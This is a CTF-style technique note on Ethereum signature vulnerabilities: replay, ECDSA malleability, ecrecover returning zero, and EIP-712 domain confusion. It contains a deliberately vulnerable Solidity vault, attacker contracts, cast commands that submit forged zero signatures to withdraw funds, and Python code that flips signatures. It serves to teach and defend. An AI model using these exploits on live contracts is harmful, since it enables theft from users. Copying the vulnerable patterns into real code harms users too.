---
title: "Signature Bugs - Replay, ECDSA Malleability, ecrecover(0) and EIP-712 Confusion"
category: blockchain
subcategory: signatures
type: technique
tags: [blockchain, ecdsa, ecrecover, signature-replay, malleability, eip712, eip191, nonce, chainid, domain-separator, secp256k1, permit, eip2612, solidity, evm, foundry, cast, web3py, signature]
difficulty: medium
summary: "Four recurring signature bugs: no nonce (replay), s-malleability (two valid sigs), ecrecover returning 0, and a domain separator that lets a signature cross contexts."
when_to_use:
  - "A function takes (v, r, s) or bytes signature and authorises an action"
  - "You see ecrecover without a zero-address check"
  - "A signed message has no nonce, deadline, chainId or contract address in it"
  - "A permit/meta-transaction/claim flow"
tools: [foundry, cast, web3py, eth-account]
related: [access-control, solidity-vuln-checklist, web3py-cheatsheet, bad-randomness]
---

## TL;DR

`ecrecover` gives you an address from a hash and a signature. Everything that makes that safe -
binding to a nonce, a chain, a contract, a deadline, and rejecting `address(0)` - is the
developer's job, and CTFs remove exactly one of those bindings.

## Recognise it

- `address signer = ecrecover(hash, v, r, s); require(signer == owner);` with **no**
  `require(signer != address(0))`.
- The signed payload lacks any of: a nonce, `block.chainid`, `address(this)`, a deadline.
- `mapping(bytes32 => bool) usedSignatures;` keyed on `keccak256(signature)` rather than on the
  message hash (malleability defeats it).
- A hand-rolled `\x19Ethereum Signed Message:\n32` prefix, or none at all.
- `DOMAIN_SEPARATOR` cached in an `immutable` at construction (breaks after a chain fork/chainId
  change, and is shared across deployments if `address(this)` is omitted).
- `abi.encodePacked` of two dynamic types inside the hash -> two different inputs, same hash.
- A `bytes signature` split with assembly and no length check.

## Theory

### ECDSA on secp256k1

A signature is `(r, s, v)` with

- `n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141` (the curve order)
- `r, s` in `[1, n-1]`, `v` in `{27, 28}` (or `{0,1}` in some libraries, `chainId*2+35/36` in EIP-155
  transaction signatures).

**Malleability**: if `(r, s, v)` is valid then so is `(r, n - s, v ^ 1)` - it recovers the *same*
address. So a signature is not a unique identifier of an authorisation. EIP-2 and OpenZeppelin's
`ECDSA` library reject `s > n/2` ("high s") for exactly this reason.

```
s' = n - s
v' = 27 if v == 28 else 28
```

**`ecrecover` returns `address(0)` on failure** - malformed `v`, `r`/`s` out of range. If the
contract compares the recovered address to a variable that is also zero (uninitialised `owner`,
`signers[someUnsetKey]`, a mapping default), any garbage signature authenticates.

### The message-hashing standards

- **EIP-191 version `0x45`** ("personal sign"):
  `keccak256("\x19Ethereum Signed Message:\n" + len(msg) + msg)`. This is what `eth_sign` on a
  32-byte digest and `personal_sign` produce.
- **EIP-712** structured data:
  `keccak256("\x19\x01" || domainSeparator || hashStruct(message))` where
  `domainSeparator = keccak256(abi.encode(TYPEHASH, keccak256(name), keccak256(version), chainId, verifyingContract, salt))`
  and `TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")`.

**Domain confusion** bugs:
- `verifyingContract` omitted -> a signature for contract A is valid on contract B (same
  name/version). Very common with factory-deployed clones.
- `chainId` omitted or cached -> cross-chain replay: the same signature works on every EVM chain
  the contract is deployed to.
- `name`/`version` shared between two contracts in the same protocol -> a `Permit` signature is
  accepted as a `Claim`, or the struct typehashes collide because the field types line up.
- Two different structs whose `hashStruct` can coincide because the `TYPEHASH` was forgotten
  (the type hash is what disambiguates; omit it and `(address,uint256)` means anything).

### Replay classes

| Missing binding | Replay across |
|---|---|
| nonce | time (same signature reused forever) |
| `chainId` | chains (mainnet sig replayed on a testnet/fork, or vice versa) |
| `address(this)` | contracts (clone/factory deployments) |
| deadline | time (an old, revoked intent still works) |
| the signer's own address in the struct | accounts (a sig meant for A used by B) |

## Attack

1. Recover the hash that is actually signed. Reproduce it exactly in Python or `cast`.
2. Check for a nonce. If none: grab any historical signature from an event or a tx's calldata and
   resend it.
3. Check for a zero-address guard. If none: send `v = 0`, `r = s = 0` (or `r` >= n) and see whether
   the compared-to variable is also zero.
4. Check for high-`s` rejection. If none and the replay guard keys on the signature bytes,
   flip `s` to `n - s` and `v` to the other value.
5. Check the domain separator. If `verifyingContract`/`chainId` is missing, find a sibling
   deployment and lift a signature from it.

## Code

### Vulnerable contract with all four bugs

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SignedVault {
    address public owner;
    mapping(bytes32 => bool) public usedSignature;   // BUG 3: keyed on the signature
    mapping(address => uint256) public balance;

    // BUG 4: no chainId, no verifyingContract
    bytes32 public constant DOMAIN_SEPARATOR =
        keccak256(abi.encode(keccak256("EIP712Domain(string name)"), keccak256("SignedVault")));
    bytes32 public constant WITHDRAW_TYPEHASH =
        keccak256("Withdraw(address to,uint256 amount)");

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    /// BUG 1: no nonce in the message -> infinite replay
    /// BUG 2: no signer != address(0) check
    function withdrawWithSig(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        bytes32 structHash = keccak256(abi.encode(WITHDRAW_TYPEHASH, to, amount));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));

        bytes32 sigId = keccak256(abi.encodePacked(v, r, s));
        require(!usedSignature[sigId], "signature used");
        usedSignature[sigId] = true;

        address signer = ecrecover(digest, v, r, s);   // no zero check
        require(signer == owner, "bad signature");

        (bool ok, ) = to.call{value: amount}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

/// A second contract whose only difference is its address -- and since the domain
/// separator omits verifyingContract, signatures cross over freely.
contract SignedVaultClone is SignedVault {}
```

### Exploit 1 - malleability to bypass the used-signature set

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

library Malleate {
    uint256 internal constant N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    /// Given a valid (v, r, s), return the other valid signature for the same signer.
    function flip(uint8 v, bytes32 r, bytes32 s)
        internal
        pure
        returns (uint8 v2, bytes32 r2, bytes32 s2)
    {
        r2 = r;
        s2 = bytes32(N - uint256(s));
        v2 = v == 27 ? 28 : 27;
    }
}

interface ISignedVault {
    function withdrawWithSig(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external;
}

contract MalleabilityAttacker {
    using Malleate for uint8;

    function replay(address vault, address to, uint256 amount, uint8 v, bytes32 r, bytes32 s)
        external
    {
        (uint8 v2, bytes32 r2, bytes32 s2) = Malleate.flip(v, r, s);
        ISignedVault(vault).withdrawWithSig(to, amount, v2, r2, s2);
    }
}
```

### Exploit 2 - `ecrecover` returning zero

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// If the contract compares ecrecover(...) against a variable that is still
/// address(0) -- an uninitialised owner, an unset role, a mapping default --
/// then ANY invalid signature authenticates.
contract ZeroRecoverProbe {
    function probe(bytes32 digest) external pure returns (address) {
        // v must be 27 or 28; 0 makes ecrecover fail and return address(0)
        return ecrecover(digest, 0, bytes32(0), bytes32(0));
    }
}
```

```bash
# does the target's signer variable read as zero?
cast call "$TARGET" "owner()(address)" --rpc-url "$RPC_URL"
# if 0x0000...0000, fire with a garbage signature
cast send "$TARGET" "withdrawWithSig(address,uint256,uint8,bytes32,bytes32)" \
  "$ME" 1000000000000000000 0 \
  0x0000000000000000000000000000000000000000000000000000000000000000 \
  0x0000000000000000000000000000000000000000000000000000000000000000 \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
```

### Python - build, flip and replay signatures

```python
#!/usr/bin/env python3
"""EIP-712 / EIP-191 signing helpers plus malleability. pip install web3 eth-account eth-utils"""
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_abi import encode as abi_encode
from eth_utils import keccak, to_checksum_address

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

EIP712_DOMAIN_TYPEHASH = keccak(
    b"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
)


def domain_separator(name: str, version: str, chain_id: int, verifying_contract: str) -> bytes:
    return keccak(
        abi_encode(
            ["bytes32", "bytes32", "bytes32", "uint256", "address"],
            [
                EIP712_DOMAIN_TYPEHASH,
                keccak(name.encode()),
                keccak(version.encode()),
                chain_id,
                to_checksum_address(verifying_contract),
            ],
        )
    )


def eip712_digest(separator: bytes, struct_hash: bytes) -> bytes:
    return keccak(b"\x19\x01" + separator + struct_hash)


def eip191_digest(message: bytes) -> bytes:
    return keccak(b"\x19Ethereum Signed Message:\n" + str(len(message)).encode() + message)


def sign_digest(private_key: str, digest: bytes):
    """Sign a raw 32-byte digest (no extra prefix). Returns (v, r, s)."""
    # eth-account renamed this: _sign_hash (<=0.11) -> unsafe_sign_hash (>=0.13)
    signer = getattr(Account, "unsafe_sign_hash", None) or Account._sign_hash
    sig = signer(digest, private_key)
    return sig.v, sig.r, sig.s


def recover_digest(digest: bytes, v: int, r: int, s: int) -> str:
    recover = getattr(Account, "_recover_hash", None) or Account.recover_message
    return recover(digest, vrs=(v, r, s))


def malleate(v: int, r: int, s: int):
    """The second valid signature for the same signer."""
    return (28 if v == 27 else 27), r, SECP256K1_N - s


def pack(v: int, r: int, s: int) -> bytes:
    return r.to_bytes(32, "big") + s.to_bytes(32, "big") + bytes([v])


if __name__ == "__main__":
    key = "0x" + "11" * 32
    acct = Account.from_key(key)

    # --- EIP-191 round trip ---
    msg = b"transfer 1 ether to 0xdead"
    signed = Account.sign_message(encode_defunct(msg), private_key=key)
    assert Account.recover_message(encode_defunct(msg), signature=signed.signature) == acct.address

    # --- malleability: the flipped signature recovers the same address ---
    digest = eip191_digest(msg)
    v, r, s = signed.v, signed.r, signed.s
    v2, r2, s2 = malleate(v, r, s)
    assert (v2, r2, s2) != (v, r, s)
    rec1 = recover_digest(digest, v, r, s)
    rec2 = recover_digest(digest, v2, r2, s2)
    assert rec1 == rec2 == acct.address, (rec1, rec2, acct.address)
    assert s2 > SECP256K1_N // 2 or s > SECP256K1_N // 2, "one of the two must be high-s"

    # --- EIP-712 digest construction ---
    withdraw_typehash = keccak(b"Withdraw(address to,uint256 amount)")
    struct_hash = keccak(
        abi_encode(
            ["bytes32", "address", "uint256"],
            [withdraw_typehash, to_checksum_address("0x000000000000000000000000000000000000dEaD"), 10**18],
        )
    )
    sep = domain_separator("SignedVault", "1", 1, "0x0000000000000000000000000000000000000001")
    d = eip712_digest(sep, struct_hash)
    assert len(d) == 32

    # the SAME struct hash under a different verifyingContract gives a different digest --
    # which is exactly the binding a vulnerable contract omits
    sep_other = domain_separator("SignedVault", "1", 1, "0x0000000000000000000000000000000000000002")
    assert eip712_digest(sep_other, struct_hash) != d

    print("[+] all signature self-tests passed")
    print("    original :", pack(v, r, s).hex())
    print("    malleated:", pack(v2, r2, s2).hex())
```

## Variants & pitfalls

- **`eth_sign` vs `personal_sign` vs raw**: if the contract hashes the digest *again* with the
  EIP-191 prefix but you signed with `personal_sign`, you get a double prefix and a different
  address. Match exactly what the contract does.
- **`v` encodings**: `{0,1}` vs `{27,28}`. Some contracts do `if (v < 27) v += 27;`.
- **Signature length**: OZ's `ECDSA.tryRecover` handles 65-byte and EIP-2098 compact 64-byte
  (`r`, `vs`) signatures. Assembly splitters that assume 65 bytes can be fed 64 and read garbage.
- **`abi.encodePacked` collisions**: `keccak256(abi.encodePacked(a, b))` with two dynamic types
  means `("ab","c")` and `("a","bc")` hash the same. If the signed struct uses `encodePacked` with
  strings/bytes, you can forge a different meaning with the same signature.
- **Nonce per-signer vs global**: a global nonce lets someone else burn your nonce (griefing) but a
  missing per-signer nonce is the replay bug.
- **Cached `DOMAIN_SEPARATOR`** with `immutable chainId` is fine unless the chain forks; OZ's
  `EIP712` recomputes when `block.chainid` changes. In a CTF, a *forked* challenge chain plus a
  mainnet signature is a real path.
- **`permit` (EIP-2612) front-running**: anyone can submit your `permit` - it is not a bug by
  itself, but a contract that calls `permit` *and* reverts if it fails can be DoS'd by front-running
  the permit.
- **ERC-1271** (`isValidSignature`) for contract signers: a contract that returns the magic value
  unconditionally accepts any signature.
- **EIP-155 chain id in transaction signatures**: a raw pre-155 transaction can be replayed on any
  chain. If the challenge hands you a raw signed tx, check for the chainId.

## Tools

- `cast wallet sign`, `cast wallet verify`, `cast wallet sign --no-hash` for raw digests.
- `eth_account` (`Account.sign_message`, `Account._sign_hash`, `Account._recover_hash`).
- `forge`'s `vm.sign(pk, digest)` cheat code in tests.
- `cast keccak`, `cast abi-encode` to reproduce typehashes.

## References

- EIP-191: Signed Data Standard.
- EIP-712: Typed structured data hashing and signing.
- EIP-2: Homestead hard-fork changes (the `s <= n/2` rule).
- EIP-2098: Compact signature representation.
